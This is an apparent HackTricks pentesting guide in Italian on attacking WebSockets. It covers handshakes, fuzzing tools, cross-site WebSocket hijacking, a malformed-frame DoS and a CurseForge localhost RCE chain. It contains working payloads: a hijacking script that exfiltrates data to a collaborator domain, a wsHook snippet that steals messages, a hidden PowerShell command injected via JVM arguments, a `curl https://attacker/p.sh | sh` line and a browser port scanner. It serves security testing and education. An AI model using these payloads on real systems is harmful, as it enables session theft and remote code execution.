# WebSocket Attacks

{{#include ../banners/hacktricks-training.md}}

## Cosa sono i WebSockets

Le connessioni WebSocket vengono stabilite tramite un handshake iniziale **HTTP** e sono progettate per essere **persistenti**, permettendo la messaggistica bidirezionale in qualsiasi momento senza la necessità di un sistema transazionale. Questo rende i WebSockets particolarmente vantaggiosi per applicazioni che richiedono **bassa latenza o comunicazione avviata dal server**, come i flussi di dati finanziari in tempo reale.

### Creazione delle connessioni WebSocket

Una spiegazione dettagliata su come stabilire connessioni WebSocket è disponibile [**here**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc). In sintesi, le connessioni WebSocket vengono solitamente iniziate tramite JavaScript lato client come mostrato di seguito:
```javascript
var ws = new WebSocket("wss://normal-website.com/ws")
```
Il protocollo `wss` indica una connessione WebSocket protetta con **TLS**, mentre `ws` indica una connessione **non protetta**.

Durante l'instaurazione della connessione viene effettuato un handshake tra il browser e il server tramite HTTP. Il processo di handshake prevede che il browser invii una richiesta e il server risponda, come illustrato nei seguenti esempi:

Il browser invia una richiesta di handshake:
```javascript
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
Risposta del server al handshake:
```javascript
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
La connessione rimane aperta per lo scambio di messaggi in entrambe le direzioni una volta stabilita.

**Punti chiave del WebSocket handshake:**

- Le intestazioni `Connection` e `Upgrade` segnalano l'avvio di un WebSocket handshake.
- L'intestazione `Sec-WebSocket-Version` indica la versione del protocollo WebSocket desiderata, di solito `13`.
- Un valore casuale codificato in Base64 viene inviato nell'intestazione `Sec-WebSocket-Key`, garantendo che ogni handshake sia unico; questo aiuta a prevenire problemi con i proxy di caching. Questo valore non serve per l'autenticazione ma per confermare che la risposta non è generata da un server o una cache mal configurati.
- L'intestazione `Sec-WebSocket-Accept` nella risposta del server è un hash del `Sec-WebSocket-Key`, verificando l'intenzione del server di aprire una connessione WebSocket.

Queste caratteristiche assicurano che il processo di handshake sia sicuro e affidabile, aprendo la strada a comunicazioni in tempo reale efficienti.

### Terminale Linux

Puoi usare `websocat` per stabilire una connessione raw con un websocket.
```bash
websocat --insecure wss://10.10.10.10:8000 -v
```
Oppure per creare un server websocat:
```bash
websocat -s 0.0.0.0:8000 #Listen in port 8000
```
### MitM websocket connections

Se scopri che i client sono connessi a un **HTTP websocket** dalla tua rete locale corrente puoi provare un [ARP Spoofing Attack ](../generic-methodologies-and-resources/pentesting-network/index.html#arp-spoofing) per effettuare un MitM tra il client e il server.\
Una volta che il client tenta di connettersi a te puoi quindi usare:
```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```
### Enumerazione Websockets

Puoi usare lo **strumento** [**https://github.com/PalindromeLabs/STEWS**](https://github.com/PalindromeLabs/STEWS) **per scoprire, fingerprint e cercare automaticamente** **vulnerabilità** nei websockets.

### Strumenti di Debug Websocket

- **Burp Suite** supporta la comunicazione MitM via websockets in modo molto simile a quanto fa per la comunicazione HTTP normale.
- L'[**socketsleuth**](https://github.com/snyk/socketsleuth) **estensione di Burp Suite** ti permetterà di gestire meglio le comunicazioni Websocket in Burp ottenendo la **history**, impostando **interception rules**, usando regole di **match and replace**, e utilizzando **Intruder** e **AutoRepeater.**
- [**WSSiP**](https://github.com/nccgroup/wssip)**:** Abbreviazione di "**WebSocket/Socket.io Proxy**", questo strumento, scritto in Node.js, fornisce un'interfaccia utente per **catturare, intercettare, inviare messaggi personalizzati** e visualizzare tutte le comunicazioni WebSocket e Socket.IO tra client e server.
- [**wsrepl**](https://github.com/doyensec/wsrepl) è un **interactive websocket REPL** progettato specificamente per penetration testing. Fornisce un'interfaccia per osservare i messaggi websocket in arrivo e inviarne di nuovi, con un framework facile da usare per automatizzare questa comunicazione.
- [**https://websocketking.com/**](https://websocketking.com/) è un'interfaccia web per comunicare con altri endpoint usando **websockets**.
- [**https://hoppscotch.io/realtime/websocket**](https://hoppscotch.io/realtime/websocket) tra altri tipi di comunicazioni/protocolli, fornisce un'interfaccia web per comunicare con altri endpoint usando **websockets.**

## Decriptare Websocket

- [https://github.com/Anof-cyber/PyCript](https://github.com/Anof-cyber/PyCript)
- [https://github.com/Anof-cyber/PyCript-WebSocket/](https://github.com/Anof-cyber/PyCript-WebSocket/)

## Websocket Lab

Nel [**Burp-Suite-Extender-Montoya-Course**](https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course) trovi del codice per avviare un web che usa websockets e in [**questo post**](https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/) puoi trovare una spiegazione.

## Websocket Fuzzing

L'estensione di Burp [**Backslash Powered Scanner**](https://github.com/PortSwigger/backslash-powered-scanner) ora permette anche di fuzzare i messaggi WebSocket. Puoi leggere più informazioni su questo [**qui**](https://arete06.com/posts/fuzzing-ws/#adding-websocket-support-to-backslash-powered-scanner).

### WebSocket Turbo Intruder (estensione Burp)

Il WebSocket Turbo Intruder di PortSwigger porta scripting in stile Turbo Intruder in Python e fuzzing ad alta velocità su WebSockets. Installalo dal BApp Store o dal sorgente. Include due componenti:

- Turbo Intruder: invio ad alto volume di messaggi a un singolo endpoint WS usando motori personalizzati.
- HTTP Middleware: espone un endpoint HTTP locale che inoltra i body come messaggi WS su una connessione persistente, così qualsiasi scanner basato su HTTP può sondare backend WS.

Pattern di script di base per fuzzare un endpoint WS e filtrare le risposte rilevanti:
```python
def queue_websockets(upgrade_request, message):
connection = websocket_connection.create(upgrade_request)
for i in range(10):
connection.queue(message, str(i))

def handle_outgoing_message(websocket_message):
results_table.add(websocket_message)

@MatchRegex(r'{\"user\":\"Hal Pline\"')
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
Usa decorator come `@MatchRegex(...)` per ridurre il rumore quando un singolo messaggio attiva più risposte.

### Ponte WS dietro HTTP (HTTP Middleware)

Incapsula una connessione WS persistente e inoltra gli HTTP bodies come WS messages per test automatizzati con HTTP scanners:
```python
def create_connection(upgrade_request):
connection = websocket_connection.create(upgrade_request)
return connection

@MatchRegex(r'{\"user\":\"You\"')
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
Quindi invia HTTP localmente; il body viene inoltrato come messaggio WS:
```http
POST /proxy?url=https%3A%2F%2Ftarget/ws HTTP/1.1
Host: 127.0.0.1:9000
Content-Length: 16

{"message":"hi"}
```
Questo ti permette di pilotare i backend WS mentre filtri per eventi “interesting” (e.g., SQLi errors, auth bypass, command injection behavior).

### Socket.IO handling (handshake, heartbeats, events)

Socket.IO aggiunge il proprio framing sopra WS. Rilevalo tramite il parametro query obbligatorio `EIO` (e.g., `EIO=4`). Mantieni la sessione attiva con Ping (`2`) e Pong (`3`) e avvia la conversazione con `"40"`, poi emetti eventi come `42["message","hello"]`.

Intruder example:
```python
import burp.api.montoya.http.message.params.HttpParameter as HttpParameter

def queue_websockets(upgrade_request, message):
connection = websocket_connection.create(
upgrade_request.withUpdatedParameters(HttpParameter.urlParameter("EIO", "4")))
connection.queue('40')
connection.queue('42["message","hello"]')

@Pong("3")
def handle_outgoing_message(websocket_message):
results_table.add(websocket_message)

@PingPong("2", "3")
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
Variante dell'adapter HTTP:
```python
import burp.api.montoya.http.message.params.HttpParameter as HttpParameter

def create_connection(upgrade_request):
connection = websocket_connection.create(
upgrade_request.withUpdatedParameters(HttpParameter.urlParameter("EIO", "4")))
connection.queue('40')
connection.decIn()
return connection

@Pong("3")
def handle_outgoing_message(websocket_message):
results_table.add(websocket_message)

@PingPong("2", "3")
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
### Rilevamento di server‑side prototype pollution via Socket.IO

Seguendo la tecnica di rilevamento sicura di PortSwigger, prova ad alterare gli internals di Express inviando un payload come:
```json
{"__proto__":{"initialPacket":"Polluted"}}
```
Se i saluti o il comportamento cambiano (es. l'echo include "Polluted"), probabilmente hai inquinato i prototype lato server. L'impatto dipende dai sink raggiungibili; correlalo con i gadget nella sezione Node.js su prototype pollution. Vedi:

- Check [NodeJS – __proto__ & prototype Pollution](deserialization/nodejs-proto-prototype-pollution/README.md) for sinks/gadgets and chaining ideas.

### WebSocket race conditions with Turbo Intruder

Il motore di default raggruppa i messaggi su una singola connessione (ottimo throughput, scarso per le race). Usa il motore THREADED per aprire più connessioni WS e inviare payload in parallelo per scatenare race logiche (double‑spend, token reuse, state desync). Parti dallo script di esempio e regola la concorrenza in `config()`.

- Learn methodology and alternatives in [Race Condition](race-condition.md) (see “RC in WebSockets”).

### WebSocket DoS: malformed frame “Ping of Death”

Crea frame WS il cui header dichiara una lunghezza di payload enorme ma non inviare il corpo. Alcuni server WS si fidano della lunghezza e pre‑allocano buffer; impostarla vicino a `Integer.MAX_VALUE` può causare Out‑Of‑Memory e un DoS remoto non autenticato. Vedi lo script di esempio.

### CLI and debugging

- Headless fuzzing: `java -jar WebSocketFuzzer-<version>.jar <scriptFile> <requestFile> <endpoint> <baseInput>`
- Abilita il WS Logger per catturare e correlare i messaggi usando ID interni.
- Usa gli helper `inc*`/`dec*` su `Connection` per modificare la gestione degli ID dei messaggi in adapter complessi.
- I decorator come `@PingPong`/`@Pong` e helper come `isInteresting()` riducono il rumore e mantengono vive le sessioni.

### Operational safety

Il fuzzing WS ad alta velocità può aprire molte connessioni e inviare migliaia di messaggi al secondo. Frame malformati e alti ritmi possono causare veri DoS. Usalo solo dove permesso.

## Cross-site WebSocket hijacking (CSWSH)

**Cross-site WebSocket hijacking**, noto anche come **cross-origin WebSocket hijacking**, è identificato come un caso specifico di **[Cross-Site Request Forgery (CSRF)](csrf-cross-site-request-forgery.md)** che interessa i WebSocket handshakes. Questa vulnerabilità nasce quando i WebSocket handshakes si autenticano esclusivamente tramite **HTTP cookies** senza **CSRF tokens** o misure simili.

Gli attaccanti possono sfruttarlo ospitando una **pagina web malevola** che innesca una connessione WebSocket cross-site verso un'applicazione vulnerabile. Di conseguenza, questa connessione viene trattata come parte della sessione della vittima con l'applicazione, sfruttando la mancanza di protezione CSRF nella gestione della sessione.

Perché questo attacco funzioni, questi sono i requisiti:

- L'autenticazione del websocket deve essere basata su cookie
- Il cookie deve essere accessibile dal server dell'attaccante (di solito significa **`SameSite=None`**), non deve essere abilitata la **Firefox Total Cookie Protection** in Firefox e non devono essere bloccati i **blocked third-party cookies** in Chrome.
- Il server websocket non deve verificare l'Origin della connessione (o questa deve essere bypassabile)

Also:

- If the authentication is based on a local connection (to localhost or to a local network) the attack **will be possible** as no current protection forbids it (check [more info here](https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/))

### Simple Attack

Nota che quando si **stabilisce** una connessione **websocket** il **cookie** viene **inviato** al server. Il **server** potrebbe usarlo per **associare** ogni **specifico** **utente** con la sua **sessione websocket** basata sul **cookie inviato**.

Poi, se ad **example** il **websocket** **server** **invia indietro la cronologia della conversazione** di un utente quando viene inviato un msg con "**READY"**, allora una **semplice XSS** che stabilisce la connessione (il **cookie** verrà **inviato** **automaticamente** per autorizzare l'utente vittima) **inviando** "**READY**" potrà **recuperare** la cronologia della **conversazione**.
```html
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
//Exfiltrate the confidential information to attackers server
fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```
### Cross Origin + Cookie con un subdomain diverso

In questo blog post [https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/) l'attaccante è riuscito a **eseguire Javascript arbitrario in un subdomain** del dominio in cui avveniva la comunicazione del web socket. Poiché era un **subdomain**, il **cookie** veniva **inviato**, e poiché il **Websocket non verificava correttamente l'Origin**, è stato possibile comunicare con esso e **rubare tokens**.

### Rubare dati dall'utente

Copia l'applicazione web che vuoi impersonare (i file .html per esempio) e all'interno dello script dove avviene la comunicazione websocket aggiungi questo codice:
```javascript
//This is the script tag to load the websocket hooker
;<script src="wsHook.js"></script>

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some <script> tags or inside a .js file
wsHook.before = function (data, url) {
var xhttp = new XMLHttpRequest()
xhttp.open("GET", "client_msg?m=" + data, true)
xhttp.send()
}
wsHook.after = function (messageEvent, url, wsObject) {
var xhttp = new XMLHttpRequest()
xhttp.open("GET", "server_msg?m=" + messageEvent.data, true)
xhttp.send()
return messageEvent
}
```
Ora scarica il file `wsHook.js` da [https://github.com/skepticfx/wshook](https://github.com/skepticfx/wshook) e **salvalo nella cartella con i file web**.\
Esponendo l'applicazione web e facendo connettere un utente ad essa potrai rubare i messaggi inviati e ricevuti via websocket:
```javascript
sudo python3 -m http.server 80
```
### Protezioni CSWSH

L'attacco CSWSH si basa sul fatto che un **utente si connetterà a una pagina malevola** che aprirà una **websocket connection** verso una pagina web a cui l'utente è già connesso e si autenticherà come lui perché la richiesta invierà i cookie dell'utente.

Oggi è molto facile prevenire questo problema:

- **Websocket server checking the origin**: Il browser dovrebbe sempre verificare da quale Origin un utente si sta connettendo per impedire a pagine inaspettate di stabilire connessioni.
- **Authentication token**: Invece di basare l'autenticazione su un cookie, la connessione websocket potrebbe basarsi su un token generato dal server per l'utente e sconosciuto all'attaccante (ad es. un anti-CSRF token).
- **SameSite Cookie attribute**: I cookie con valore `SameSite` impostato su `Lax` o `Strict` non verranno inviati da una pagina di un attaccante esterno al server vittima; di conseguenza, l'autenticazione basata su cookie fallirà. Nota che Chrome ora imposta di default il valore **`Lax`** per i cookie a cui non è stato specificato questo flag, rendendo il comportamento più sicuro. Tuttavia, nei primi 2 minuti dalla creazione un cookie avrà valore **`None`**, rendendolo vulnerabile durante quel breve periodo (è anche previsto che questa misura venga rimossa in futuro).
- **Firefox Total Cookie Protection**: Total Cookie Protection isola i cookie al sito in cui vengono creati. Essenzialmente ogni sito ha la propria partizione di storage dei cookie per impedire a terze parti di correlare la cronologia di navigazione di un utente. Questo rende **CSWSH unusable** in quanto il sito dell'attaccante non avrà accesso ai cookie.
- **Chrome third-party cookies block**: Questo può anche impedire l'invio del cookie dell'utente autenticato al websocket server anche con `SameSite=None`.

### Abuso di WebSocket su localhost e scoperta delle porte del browser

I launcher desktop spesso avviano helper (es. CurseForge's `CurseAgent.exe`) che espongono JSON-RPC WebSockets su `127.0.0.1:<random_port>`. Il browser **does not enforce SOP on loopback sockets**, quindi qualsiasi pagina web può tentare l'handshake. Se l'agent accetta valori arbitrari di `Origin` e salta l'autenticazione secondaria, la superficie IPC diventa controllabile da remoto direttamente via JavaScript.

#### Enumerazione dei metodi esposti

Cattura una sessione legittima per apprendere il contratto del protocollo. CurseForge, per esempio, emette frame come `{"type":"method","name":"minecraftTaskLaunchInstance","args":[{...}]}` dove `name` è il metodo RPC e `args` contiene oggetti strutturati (GUID, risoluzione, flag, ecc.). Una volta nota questa forma puoi invocare metodi come `createModpack`, `minecraftGetDefaultLocation`, o qualsiasi altro task privilegiato direttamente da una pagina iniettata.

#### Scoperta delle porte via browser

Poiché l'helper si lega a una porta alta casuale, l'exploit prima effettua brute-force su localhost via WebSockets. I browser basati su Chromium tollerano ~16k upgrade falliti prima di iniziare a throttling, il che è sufficiente per scandire l'intervallo effimero; Firefox tende a crashare o bloccarsi dopo poche centinaia di fallimenti, quindi i PoC pratici spesso prendono di mira Chromium.

<details>
<summary>Scanner minimale per browser</summary>
```javascript
async function findLocalWs(start = 20000, end = 36000) {
for (let port = start; port <= end; port++) {
await new Promise((resolve) => {
const ws = new WebSocket(`ws://127.0.0.1:${port}/`);
let settled = false;
const finish = () => { if (!settled) { settled = true; resolve(); } };
ws.onerror = ws.onclose = finish;
ws.onopen = () => {
console.log(`Found candidate on ${port}`);
ws.close();
finish();
};
});
}
}
```
</details>

Una volta che una connessione supera l'handshake e restituisce dati specifici del protocollo, riutilizza quel socket per la catena RPC.

#### Concatenare metodi JSON-RPC in RCE

L'exploit CurseForge concatena due chiamate non autenticate:

1. `createModpack` → restituisce un nuovo `MinecraftInstanceGuid` senza interazione dell'utente.
2. `minecraftTaskLaunchInstance` → avvia quel GUID accettando flag JVM arbitrari tramite `AdditionalJavaArguments`.

Le opzioni diagnostiche JNI/JVM forniscono quindi un primitivo RCE pronto all'uso. Ad esempio, limita il metaspace per forzare un crash e sfrutta l'hook di errore per l'esecuzione di comandi:
```
-XX:MaxMetaspaceSize=16m -XX:OnOutOfMemoryError="cmd.exe /c powershell -nop -w hidden -EncodedCommand ..."
```
Su target Unix basta sostituire il payload con `/bin/sh -c 'curl https://attacker/p.sh | sh'`. Questo funziona anche quando non puoi toccare il codice dell'applicazione — controllare la JVM CLI è sufficiente.

Questo “create resource → privileged launch” pattern appare spesso in updaters e launchers. Ogni volta che il metodo (1) restituisce un identificatore tracciato dal server e il metodo (2) esegue codice o avvia un processo con quell'identificatore, verifica se possono essere iniettati argomenti controllati dall'utente.


## Race Conditions

Le Race Conditions nei WebSockets sono anche comuni; [consulta queste informazioni per saperne di più](race-condition.md#rc-in-websockets).

## Altre vulnerabilità

Poiché i Web Sockets sono un meccanismo per **inviare dati al server e al client**, a seconda di come il server e il client gestiscono le informazioni, **i Web Sockets possono essere usati per sfruttare diverse altre vulnerabilità come XSS, SQLi o qualsiasi altra vulnerabilità web comune usando l'input di un utente da un websocket.**

## **WebSocket Smuggling**

Questa vulnerabilità potrebbe permetterti di **bypassare le restrizioni dei reverse proxies** facendoli credere che una **websocket communication was stablished** (anche se non è vero). Questo potrebbe permettere a un attacker di **accedere a endpoint nascosti**. Per ulteriori informazioni controlla la pagina seguente:


{{#ref}}
h2c-smuggling.md
{{#endref}}

## Riferimenti

- [https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages](https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages)
- [https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/](https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocket Turbo Intruder – BApp Store](https://portswigger.net/bappstore/ba292c5982ea426c95c9d7325d9a1066)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [Turbo Intruder background](https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack)
- [Server-side prototype pollution – safe detection methods](https://portswigger.net/research/server-side-prototype-pollution#safe-detection-methods-for-manual-testers)
- [WS RaceCondition PoC (Java)](https://github.com/redrays-io/WS_RaceCondition_PoC)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)
- [PingOfDeathExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/PingOfDeathExample.py)
- [When WebSockets Lead to RCE in CurseForge](https://elliott.diy/blog/curseforge/)

{{#include ../banners/hacktricks-training.md}}
